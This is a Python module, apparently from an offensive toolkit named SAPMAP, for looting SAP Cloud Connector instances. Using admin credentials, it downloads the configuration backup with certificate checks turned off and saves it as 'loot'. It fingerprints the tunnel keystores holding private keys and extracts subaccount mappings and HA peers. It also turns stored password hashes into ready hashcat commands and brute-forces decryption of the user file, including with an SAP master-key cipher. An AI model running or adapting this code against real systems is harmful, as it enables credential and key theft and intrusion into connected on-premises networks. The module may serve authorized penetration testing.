#!/usr/bin/env python3
"""SAPMAP — SCC trust-store / keystore extraction.

Pulls the full SCC configuration backup via
``POST /api/v1/configuration/backup`` and parses out the high-value
keystore artifacts:

    config/ks.p12                                     -> admin UI keystore
    scc_config/scc.p12                                -> system identity keystore
    scc_config/<region>/<subaccount>/scc.p12          -> per-subaccount
                                                          tunnel client cert
                                                          + private key
                                                          (BTP authenticates
                                                           the SCC with this)
    scc_config/SSFS_SCC.KEY / SSFS_SCC.DAT            -> SAP Secure Storage
                                                          File System
                                                          (PP CA private key
                                                           lives here when
                                                           PP is configured)
    config/users.xml                                  -> local SCC users +
                                                          (hashed) passwords

The backup endpoint requires a caller-supplied passphrase that protects
the keystores inside the zip; we don't unlock the p12s here (avoids
adding a `cryptography` dep), instead computing SHA-256 over each
keystore's bytes as the per-keystore fingerprint stored on
``SCCNode.tunnel_privkey_fp`` / ``pp_ca_privkey_fp``.  The fingerprint
is still a stable per-key identifier for cross-session tracking.

Extraction is **destructive-adjacent**: the backup file ends up on disk
in ``loot_dir`` (default ``./loot/scc/<host>/``) and SHOULD be treated
as crown-jewels material.  Findings emitted are CRITICAL.

Usage
-----
    from sapmap_scc_keystore import extract_keystore
    res = extract_keystore("192.168.2.167", "Administrator", "SccAdmin123!",
                           backup_password="SccAdmin123!")
    # res = {
    #   "ok": True,
    #   "loot_path": "/abs/path/to/scc_backup_<host>_<ts>.zip",
    #   "system_keystore": {"path": "scc_config/scc.p12", "sha256": "..."},
    #   "tunnel_keystores": [
    #       {"region": "...", "subaccount": "...",
    #        "path": "scc_config/.../scc.p12", "sha256": "..."},
    #   ],
    #   "ssfs_present": True | False,
    #   "users_xml_present": True | False,
    #   "members": [<filename>, ...],
    # }
"""
from __future__ import annotations

import hashlib
import io
import json
import os
import re
import ssl
import time
import urllib.request as _urlreq
import urllib.error as _urlerr
import xml.etree.ElementTree as _ET
import zipfile
from datetime import datetime
from typing import Optional


def _slug(s: str) -> str:
    """Filesystem-safe slug for use in loot file paths."""
    return re.sub(r"[^A-Za-z0-9._-]+", "_", s or "?")


def _ssl_ctx() -> ssl.SSLContext:
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    return ctx


def _basic_header(user: str, password: str) -> dict:
    import base64
    blob = base64.b64encode(f"{user}:{password}".encode()).decode()
    return {"Authorization": f"Basic {blob}"}


def fetch_backup(host: str, user: str, password: str,
                 backup_password: str,
                 port: int = 8443, timeout: float = 30.0
                 ) -> bytes:
    """POST to /api/v1/configuration/backup and return the zip bytes.

    Raises on auth failure / 4xx — caller wraps in try/except.
    """
    url = f"https://{host}:{port}/api/v1/configuration/backup"
    body = json.dumps({"password": backup_password}).encode()
    hdrs = _basic_header(user, password)
    hdrs["Content-Type"] = "application/json"
    hdrs["Accept"] = "*/*"
    req = _urlreq.Request(url, data=body, method="POST", headers=hdrs)
    with _urlreq.urlopen(req, timeout=timeout, context=_ssl_ctx()) as r:
        return r.read()


def _sha256(b: bytes) -> str:
    return hashlib.sha256(b).hexdigest()


def parse_backup(zip_bytes: bytes) -> dict:
    """Inspect a backup zip and return a structured summary.

    Does NOT unlock the p12s (we don't have the keystore-internal
    password).  Each keystore is described by its filename inside the
    archive plus the SHA-256 of its byte content.
    """
    summary = {
        "ok": True,
        "members": [],
        "system_keystore": None,           # scc_config/scc.p12
        "ui_keystore": None,               # config/ks.p12
        "tunnel_keystores": [],            # per-subaccount scc.p12
        "ssfs_present": False,             # SSFS_SCC.KEY + SSFS_SCC.DAT
        "users_xml_present": False,
        "users_xml_sha256": "",
        "manifest": {},
    }
    bio = io.BytesIO(zip_bytes)
    try:
        zf = zipfile.ZipFile(bio)
    except zipfile.BadZipFile:
        return {"ok": False, "error": "response is not a zip archive"}
    summary["members"] = [i.filename for i in zf.infolist()]
    have_ssfs_key = False
    have_ssfs_dat = False
    sub_re = re.compile(
        r"^scc_config/(?P<region>[^/]+)/(?P<sub>[0-9a-fA-F-]{36})/scc\.p12$")
    for info in zf.infolist():
        name = info.filename
        if name == "scc_config/scc.p12":
            summary["system_keystore"] = {
                "path": name,
                "sha256": _sha256(zf.read(info)),
                "size": info.file_size,
            }
            continue
        if name == "config/ks.p12":
            summary["ui_keystore"] = {
                "path": name,
                "sha256": _sha256(zf.read(info)),
                "size": info.file_size,
            }
            continue
        m = sub_re.match(name)
        if m:
            summary["tunnel_keystores"].append({
                "region": m.group("region"),
                "subaccount": m.group("sub"),
                "path": name,
                "sha256": _sha256(zf.read(info)),
                "size": info.file_size,
            })
            continue
        if name == "scc_config/SSFS_SCC.KEY":
            have_ssfs_key = True
        if name == "scc_config/SSFS_SCC.DAT":
            have_ssfs_dat = True
        if name == "config/users.xml":
            summary["users_xml_present"] = True
            summary["users_xml_sha256"] = _sha256(zf.read(info))
        if name == "manifest.json":
            try:
                summary["manifest"] = json.loads(zf.read(info))
            except Exception:
                pass
    summary["ssfs_present"] = have_ssfs_key and have_ssfs_dat
    return summary


def _xml_text(parent, tag: str, default: str = "") -> str:
    el = parent.find(tag)
    return (el.text or default).strip() if (el is not None and el.text is not None) else default


def _safe_int(v, default: int = 0) -> int:
    try:
        return int(v)
    except (TypeError, ValueError):
        return default


def _parse_resources_xml(blob: bytes) -> list:
    """Convert a per-mapping <virtualHost>_<virtualPort>.xml resource list
    into the path_allowlist shape produced by the live admin API.

    SCC on-disk fields:
        resourceName  – the path
        enabled       – bool
        wildcard      – true means PATH_AND_ALL_SUB_PATHS, false means exact
        websocketUpgradeAllowed
        description
    """
    out: list = []
    try:
        root = _ET.fromstring(blob)
    except _ET.ParseError:
        return out
    for r in root.iter("resource"):
        path = _xml_text(r, "resourceName")
        wildcard = _xml_text(r, "wildcard").lower() == "true"
        enabled = _xml_text(r, "enabled", "true").lower() == "true"
        out.append({
            "path": path,
            "policy": "PATH_AND_ALL_SUB_PATHS" if wildcard else "PATH",
            "exact_match_only": not wildcard,
            "enabled": enabled,
            "description": _xml_text(r, "description"),
            "websocket_upgrade_allowed":
                _xml_text(r, "websocketUpgradeAllowed").lower() == "true",
        })
    return out


def parse_mappings_from_zip(loot_zip_path: str) -> dict:
    """Parse cloud→on-prem mappings straight out of a backup zip.

    Walks ``scc_config/<region>/<uuid>/backends.xml`` for each subaccount,
    expands the resource allowlist via the sibling
    ``<virtualHost>_<virtualPort>.xml`` file, and returns a payload
    matching what ``sapmap_scc_admin.pull_mappings`` produces over the
    network — so callers can feed it through the same post-processing.

    Returns::

        {
          "ok": True,
          "mappings": [<normalized mapping dict>, ...],
          "subaccount_uuids": [...],
          "regions": [...],
        }

    or ``{"ok": False, "error": ...}`` on failure.
    """
    out_maps: list = []
    uuids: list = []
    regions: list = []
    sub_dir_re = re.compile(
        r"^scc_config/(?P<region>[^/]+)/(?P<sub>[0-9a-fA-F-]{36})/$")
    backends_re = re.compile(
        r"^scc_config/(?P<region>[^/]+)/(?P<sub>[0-9a-fA-F-]{36})/backends\.xml$")
    try:
        zf = zipfile.ZipFile(loot_zip_path)
    except (zipfile.BadZipFile, FileNotFoundError) as e:
        return {"ok": False, "error": f"bad loot zip: {e}"}
    names = set(zf.namelist())
    # Discover subaccount directories from any path beneath them, since
    # zips may not include explicit directory entries.
    discovered: dict[tuple[str, str], None] = {}
    for n in names:
        m = sub_dir_re.match(n) or sub_dir_re.match(n.rsplit("/", 1)[0] + "/")
        if not m:
            mb = backends_re.match(n)
            if not mb:
                continue
            key = (mb.group("region"), mb.group("sub"))
        else:
            key = (m.group("region"), m.group("sub"))
        discovered.setdefault(key, None)
    for region, sub in discovered:
        if sub not in uuids:
            uuids.append(sub)
        if region not in regions:
            regions.append(region)
        bn = f"scc_config/{region}/{sub}/backends.xml"
        if bn not in names:
            continue
        try:
            tree = _ET.fromstring(zf.read(bn))
        except _ET.ParseError:
            continue
        for sm in tree.iter("systemMapping"):
            vhost = _xml_text(sm, "virtualHost")
            vport = _safe_int(_xml_text(sm, "virtualPort"))
            auth = _xml_text(sm, "authenticationMode")
            mapping = {
                "virtual_host": vhost,
                "virtual_port": vport,
                "internal_host": _xml_text(sm, "internalHost"),
                "internal_port": _safe_int(_xml_text(sm, "internalPort")),
                "protocol": _xml_text(sm, "communicationProtocol"),
                "path_allowlist": [],
                "path_wildcards": False,
                "backend_type": _xml_text(sm, "backendType"),
                "principal_propagation": auth in ("X509_GENERAL", "KERBEROS"),
                "authentication_mode": auth,
                "sid": _xml_text(sm, "sid"),
                "host_in_header": _xml_text(sm, "internalHostInHeader"),
                "description": _xml_text(sm, "description"),
                "total_resources": 0,
                "enabled_resources": 0,
                "subaccount": sub,
                "region": region,
            }
            res_name = f"scc_config/{region}/{sub}/{vhost}_{vport}.xml"
            if res_name in names:
                try:
                    mapping["path_allowlist"] = _parse_resources_xml(zf.read(res_name))
                except KeyError:
                    pass
                mapping["total_resources"] = len(mapping["path_allowlist"])
                mapping["enabled_resources"] = sum(
                    1 for r in mapping["path_allowlist"] if r.get("enabled", True))
            out_maps.append(mapping)
    return {
        "ok": True,
        "mappings": out_maps,
        "subaccount_uuids": uuids,
        "regions": regions,
    }


def parse_ha_state_from_zip(loot_zip_path: str) -> dict:
    """Pull HA state out of a backup zip's scc_config/scc_config.ini.

    The REST API on most SCC builds only exposes ``ha:{role}`` and not
    the shadow/master peer host or the ``isShadowEnabled`` /
    ``isHaActive`` flags.  Those fields ARE present in scc_config.ini
    inside the backup, so we parse them straight from the zip.

    Returns::

        {
          "ok": True,
          "role": "master" | "shadow" | "",
          "is_shadow_enabled": bool,
          "is_ha_active": bool,
          "shadow_host": "<peer host when we are master>",
          "master_host": "<peer host when we are shadow>",
          "peer_host": "<the *other* host, role-aware>",
          "peer_role": "shadow" | "master" | "",
        }

    The ini file is actually XML despite the .ini extension.  Unknown
    fields are silently treated as empty.  ``ok=False`` on parse error.
    """
    try:
        zf = zipfile.ZipFile(loot_zip_path)
    except (zipfile.BadZipFile, FileNotFoundError) as e:
        return {"ok": False, "error": f"bad loot zip: {e}"}
    target = "scc_config/scc_config.ini"
    if target not in zf.namelist():
        return {"ok": False, "error": f"{target} not in zip"}
    try:
        blob = zf.read(target)
    except KeyError as e:
        return {"ok": False, "error": f"read failed: {e}"}
    try:
        root = _ET.fromstring(blob)
    except _ET.ParseError as e:
        return {"ok": False, "error": f"xml parse failed: {e}"}

    def _gather(tag):
        # findtext walks the immediate children only — search the whole
        # tree because SCC nests these under different parents per build.
        for el in root.iter(tag):
            t = (el.text or "").strip()
            if t:
                return t
        return ""

    role = _gather("haRole").lower()
    is_shadow_enabled = _gather("isShadowEnabled").lower() == "true"
    is_ha_active = _gather("isHaActive").lower() == "true"
    shadow_host = _gather("shadowHost") or _gather("shadowSystemHost") \
        or _gather("shadowHostName")
    master_host = _gather("masterHost") or _gather("masterSystemHost") \
        or _gather("masterHostName")
    if role == "master":
        peer_host = shadow_host
        peer_role = "shadow" if peer_host else ""
    elif role == "shadow":
        peer_host = master_host
        peer_role = "master" if peer_host else ""
    else:
        peer_host = shadow_host or master_host
        peer_role = ""
    return {
        "ok": True,
        "role": role,
        "is_shadow_enabled": is_shadow_enabled,
        "is_ha_active": is_ha_active,
        "shadow_host": shadow_host,
        "master_host": master_host,
        "peer_host": peer_host,
        "peer_role": peer_role,
    }


def parse_user_hashes_from_xml(xml_bytes: bytes) -> dict:
    """Parse SCC users.xml content (on-disk plaintext, not backup-zip).

    SCC stores local admin-UI user credentials in
    ``/opt/sap/scc/config/users.xml``.  The password hash field and
    algorithm vary by build:

    Older builds (< ~2.15) — SHA-1 with hex or base64 salt+hash:
        <Password algorithm="SHA-1" salt="<b64salt>" value="<b64hash>" />

    Newer builds (≥ 2.15) — PBKDF2-HMAC-SHA256 or plain SHA-256:
        <Password algorithm="SHA-256" iterations="<n>"
                  salt="<b64salt>" value="<b64hash>" />

    Both flavours: hash = ALGO(salt_bytes || password_bytes).
    Hashcat modes:
        SHA-1 plain  → -m 110  sha1($pass.$salt) — try also -m 111
        SHA-256 plain → -m 1410 sha256($pass.$salt) — try -m 1411
        PBKDF2-SHA256 → -m 10900

    Returns::

        {
          "ok": True,
          "users": [
            {
              "username": str,
              "algorithm": "SHA-1" | "SHA-256" | "PBKDF2" | "",
              "iterations": int,          # 1 for plain hash
              "salt_b64": str,
              "hash_b64": str,
              "salt_hex": str,
              "hash_hex": str,
              "hashcat_line": str,        # ready-to-paste hash:salt
              "hashcat_mode": int,        # best-guess mode
              "locked": bool,
              "roles": str,
            }, ...
          ],
          "hashcat_commands": [str, ...],
        }
    """
    import base64 as _b64
    import binascii as _bx

    def _b64_to_hex(s):
        try:
            return _bx.hexlify(_b64.b64decode(s)).decode()
        except Exception:
            return s

    try:
        root = _ET.fromstring(xml_bytes)
    except _ET.ParseError as e:
        return {"ok": False, "error": f"XML parse error: {e}"}

    users = []
    for u in root.iter("User"):
        uname = u.get("name") or u.get("userName") or ""
        locked = (u.get("locked") or "").lower() == "true"
        roles = u.get("roles") or u.get("role") or ""
        pw = u.find("Password")
        if pw is None:
            pw = u.find("password")
        if pw is None:
            users.append({"username": uname, "locked": locked,
                          "roles": roles, "algorithm": "",
                          "hash_b64": "", "salt_b64": "",
                          "hash_hex": "", "salt_hex": "",
                          "hashcat_line": "", "hashcat_mode": 0,
                          "iterations": 1})
            continue
        algo_raw = (pw.get("algorithm") or pw.get("algo") or "").upper()
        algo_raw = algo_raw.replace("-", "").replace("_", "")
        iters = int(pw.get("iterations") or pw.get("count") or 1)
        salt_b64 = (pw.get("salt") or pw.get("saltValue") or "").strip()
        hash_b64 = (pw.get("value") or pw.get("hashValue") or "").strip()
        # Some builds store hex directly
        if not salt_b64:
            salt_b64 = (pw.get("saltHex") or "")
            if salt_b64:
                salt_b64 = _b64.b64encode(
                    bytes.fromhex(salt_b64)).decode()
        if not hash_b64:
            hash_b64 = (pw.get("hashHex") or "")
            if hash_b64:
                hash_b64 = _b64.b64encode(
                    bytes.fromhex(hash_b64)).decode()
        salt_hex = _b64_to_hex(salt_b64)
        hash_hex = _b64_to_hex(hash_b64)
        # Map algorithm to hashcat mode
        if "SHA256" in algo_raw or "SHA2" in algo_raw:
            if iters > 1:
                algo = "PBKDF2-SHA256"
                mode = 10900
                # hashcat PBKDF2-SHA256 format: sha256:iters:b64salt:b64hash
                hline = f"sha256:{iters}:{salt_b64}:{hash_b64}"
            else:
                algo = "SHA-256"
                mode = 1410
                hline = f"{hash_hex}:{salt_hex}"
        elif "SHA1" in algo_raw or "SHA" in algo_raw:
            algo = "SHA-1"
            mode = 110
            hline = f"{hash_hex}:{salt_hex}"
        else:
            algo = algo_raw or "unknown"
            mode = 0
            hline = f"{hash_hex}:{salt_hex}"
        users.append({
            "username": uname,
            "algorithm": algo,
            "iterations": iters,
            "salt_b64": salt_b64,
            "hash_b64": hash_b64,
            "salt_hex": salt_hex,
            "hash_hex": hash_hex,
            "hashcat_line": hline,
            "hashcat_mode": mode,
            "locked": locked,
            "roles": roles,
        })

    # Build per-algorithm hashcat commands
    cmds = []
    modes_seen = {}
    for u in users:
        m = u["hashcat_mode"]
        if m and m not in modes_seen:
            modes_seen[m] = u["algorithm"]
    if 110 in modes_seen:
        cmds.append(
            "hashcat -m 110 scc_sha1_hashes.txt /path/to/wordlist.txt\n"
            "# SHA-1(pass+salt) — format: hash:salt (hex)\n"
            "# If no hits: try -m 111  (SHA-1 with salt prepended)")
    if 1410 in modes_seen:
        cmds.append(
            "hashcat -m 1410 scc_sha256_hashes.txt /path/to/wordlist.txt\n"
            "# SHA-256(pass+salt) — format: hash:salt (hex)\n"
            "# If no hits: try -m 1411 (SHA-256 with salt prepended)")
    if 10900 in modes_seen:
        cmds.append(
            "hashcat -m 10900 scc_pbkdf2_hashes.txt /path/to/wordlist.txt\n"
            "# PBKDF2-HMAC-SHA256 — format: sha256:iters:b64salt:b64hash")
    if not cmds and users:
        cmds.append(
            "# Algorithm unknown — check hash length and try:\n"
            "# hashcat -m 110 (SHA-1) or -m 1410 (SHA-256)")

    return {"ok": True, "users": users, "hashcat_commands": cmds}


def try_decrypt_users_xml(zip_path: str, backup_password: str,
                           loot_dir: str) -> Optional[str]:
    """Attempt to decrypt config/users.xml from a backup zip.

    Tries all known cipher approaches (PBKDF2+AES variants, RSEC).
    Returns the path to the saved plaintext file on success, or None.

    This is option-2 infrastructure — decryption will succeed once the
    SCC backup cipher is RE'd (option 3 backlog) and the correct
    approach is added here.  The backup_password parameter is stored
    for future use even when all current approaches fail.
    """
    try:
        import zipfile as _zf
        zf = _zf.ZipFile(zip_path)
        if "config/users.xml" not in zf.namelist():
            return None
        encrypted = zf.read("config/users.xml")
        esalt = zf.read("esalt.bin") if "esalt.bin" in zf.namelist() else b""
    except Exception:
        return None

    pw = backup_password.encode() if backup_password else b""
    xml_bytes = None

    # --- Approach A: zip-level password (standard AES-Zip) ---
    if not xml_bytes:
        try:
            zf.setpassword(pw)
            raw = zf.read("config/users.xml")
            if raw[:1] in (b"<", b"\xef"):
                xml_bytes = raw
        except Exception:
            pass

    # --- Approach B: PBKDF2+AES-GCM (12B nonce per file) ---
    if not xml_bytes and esalt and pw:
        try:
            from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
            from cryptography.hazmat.primitives import hashes
            from cryptography.hazmat.primitives.ciphers.aead import AESGCM
            for algo in [hashes.SHA256(), hashes.SHA1()]:
                for iters in [10000, 65536, 100000]:
                    for klen in [32, 16]:
                        for salt_bytes in [esalt, esalt[:16], esalt[:28]]:
                            try:
                                kdf = PBKDF2HMAC(algorithm=algo, length=klen,
                                                  salt=salt_bytes, iterations=iters)
                                key = kdf.derive(pw)
                                pt = AESGCM(key).decrypt(
                                    encrypted[:12], encrypted[12:], None)
                                if pt[:1] in (b"<", b"\xef"):
                                    xml_bytes = pt
                                    break
                            except Exception:
                                pass
                        if xml_bytes:
                            break
                    if xml_bytes:
                        break
                if xml_bytes:
                    break
        except Exception:
            pass

    # --- Approach C: PBKDF2+AES-CBC (IV from esalt tail) ---
    if not xml_bytes and esalt and pw:
        try:
            from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
            from cryptography.hazmat.primitives import hashes
            from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
            from cryptography.hazmat.primitives.padding import PKCS7
            iv = esalt[-16:]
            for algo in [hashes.SHA256(), hashes.SHA1()]:
                for iters in [10000, 65536, 100000]:
                    for klen in [32, 16]:
                        try:
                            kdf = PBKDF2HMAC(algorithm=algo, length=klen,
                                              salt=esalt[:-16], iterations=iters)
                            key = kdf.derive(pw)
                            cipher = Cipher(algorithms.AES(key), modes.CBC(iv))
                            pt = cipher.decryptor().update(encrypted) + \
                                 cipher.decryptor().finalize()
                            up = PKCS7(128).unpadder()
                            pt2 = up.update(pt) + up.finalize()
                            if pt2[:1] in (b"<", b"\xef"):
                                xml_bytes = pt2
                                break
                        except Exception:
                            pass
                    if xml_bytes:
                        break
                if xml_bytes:
                    break
        except Exception:
            pass

    # --- Approach D: RSEC cipher (SAP global master key) ---
    if not xml_bytes:
        try:
            import sys as _sys
            if "." not in _sys.path:
                _sys.path.insert(0, ".")
            from sap_rsec_cipher import rsec_decrypt, rsec_decrypt_key, RSEC_MASTER_KEY
            # Decrypt esalt to get DEK, try decrypting users.xml
            dec_esalt = rsec_decrypt(esalt, RSEC_MASTER_KEY)
            for start in range(0, len(dec_esalt) - 23, 4):
                dek = dec_esalt[start:start+24]
                try:
                    pt = rsec_decrypt(encrypted, dek)
                    if pt[:1] in (b"<", b"\xef"):
                        xml_bytes = pt
                        break
                except Exception:
                    pass
        except Exception:
            pass

    if xml_bytes is None:
        return None

    # Save plaintext
    os.makedirs(loot_dir, exist_ok=True)
    out_path = os.path.join(loot_dir, "users_plaintext.xml")
    with open(out_path, "wb") as fh:
        fh.write(xml_bytes)
    try:
        os.chmod(out_path, 0o600)
    except Exception:
        pass
    return out_path


def extract_keystore(host: str, user: str, password: str, *,
                     backup_password: Optional[str] = None,
                     port: int = 8443, timeout: float = 30.0,
                     loot_dir: Optional[str] = None
                     ) -> dict:
    """End-to-end extraction: pull backup, save to loot_dir, parse.

    ``backup_password`` defaults to ``password`` (admin login password)
    when not supplied — the SCC accepts any string here, it's used to
    encrypt the resulting zip's keystores.  Operators who want
    distinct passphrases can pass one explicitly.

    Returns a dict matching ``parse_backup`` plus ``loot_path``.  On
    failure returns ``{ok: False, error: <reason>}``.
    """
    bpw = backup_password or password
    if loot_dir is None:
        loot_dir = os.path.join(os.getcwd(), "loot", "scc", _slug(host))
    os.makedirs(loot_dir, exist_ok=True)
    try:
        data = fetch_backup(host, user, password, bpw,
                            port=port, timeout=timeout)
    except _urlerr.HTTPError as e:
        try:
            err_body = e.read().decode("utf-8", "replace")
        except Exception:
            err_body = ""
        return {"ok": False,
                "error": f"HTTP {e.code} from backup endpoint: {err_body[:200]}"}
    except Exception as e:
        return {"ok": False, "error": f"backup fetch failed: {e}"}
    if not data or data[:2] != b"PK":
        return {"ok": False, "error": "backup endpoint returned non-zip data"}
    ts = datetime.now().strftime("%Y%m%dT%H%M%S")
    fname = f"scc_backup_{_slug(host)}_{ts}.zip"
    loot_path = os.path.join(loot_dir, fname)
    try:
        with open(loot_path, "wb") as fh:
            fh.write(data)
        # Tighten permissions — keystore loot is crown-jewels material.
        try:
            os.chmod(loot_path, 0o600)
        except Exception:
            pass
    except Exception as e:
        return {"ok": False, "error": f"could not write loot file: {e}"}
    summary = parse_backup(data)
    summary["loot_path"] = loot_path
    summary["loot_size"] = len(data)
    summary["fetched_at"] = datetime.now().isoformat(timespec="seconds")
    return summary
